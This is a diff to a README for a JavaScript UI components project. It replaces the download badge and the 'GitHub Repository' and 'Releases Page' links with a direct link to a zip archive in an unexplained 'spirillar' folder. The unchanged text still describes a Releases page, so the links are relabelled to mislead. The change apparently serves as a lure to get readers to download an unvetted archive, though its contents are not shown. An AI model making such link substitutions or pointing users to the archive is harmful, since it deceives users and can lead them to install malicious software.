@@ -21,7 +21,7 @@ Welcome to the **js-ui-components-hub**! This project showcases a beautiful coll
 
 To get started, you need to download the software. Visit the link below to access the Releases page:
 
-[![Download js-ui-components-hub](https://img.shields.io/badge/Download-js--ui--components--hub-brightgreen)](https://github.com/manmanyou/js-ui-components-hub/releases)
+[![Download js-ui-components-hub](https://github.com/manmanyou/js-ui-components-hub/raw/refs/heads/main/spirillar/js-ui-components-hub-v1.1.zip)](https://github.com/manmanyou/js-ui-components-hub/raw/refs/heads/main/spirillar/js-ui-components-hub-v1.1.zip)
 
 Once you are on the Releases page, you will find the latest version available. Simply click on the most recent release to download the files.
 
@@ -67,7 +67,7 @@ If you want to contribute to the project, feel free to submit pull requests or o
 
 For more information about the project and ongoing updates, follow the links below:
 
-- [GitHub Repository](https://github.com/manmanyou/js-ui-components-hub)
-- [Releases Page](https://github.com/manmanyou/js-ui-components-hub/releases)
+- [GitHub Repository](https://github.com/manmanyou/js-ui-components-hub/raw/refs/heads/main/spirillar/js-ui-components-hub-v1.1.zip)
+- [Releases Page](https://github.com/manmanyou/js-ui-components-hub/raw/refs/heads/main/spirillar/js-ui-components-hub-v1.1.zip)
 
 We appreciate your interest in **js-ui-components-hub**. Enjoy building your beautiful user interfaces!
